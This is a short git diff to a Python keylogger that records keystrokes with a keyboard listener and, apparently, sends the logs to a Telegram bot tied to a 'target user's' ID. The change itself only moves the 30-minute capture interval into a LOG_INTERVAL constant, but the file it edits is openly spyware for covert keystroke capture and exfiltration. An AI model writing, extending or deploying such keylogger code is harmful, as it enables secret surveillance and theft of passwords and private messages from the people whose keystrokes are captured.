@@ -5,6 +5,7 @@ import requests
 # Telegram Bot Configuration
 BOT_API_TOKEN = "YOUR_BOT_API_TOKEN"  # Replace with your bot's API token
 USER_ID = "USER_ID"  # Replace with the target user's Telegram ID
+LOG_INTERVAL = 1800  # Interval in seconds (default: 30 minutes)
 
 # Keystroke storage
 keystrokes = []
@@ -41,7 +42,7 @@ while True:
 
     # Set up keyboard listener
     with k.Listener(on_press=on_press) as listener:
-        t.sleep(1800)  # Capture keystrokes for 30 minutes
+        t.sleep(LOG_INTERVAL)  # Capture keystrokes for 30 minutes
 
     # Convert keystrokes list to string
     log_data = ''.join(keystrokes)
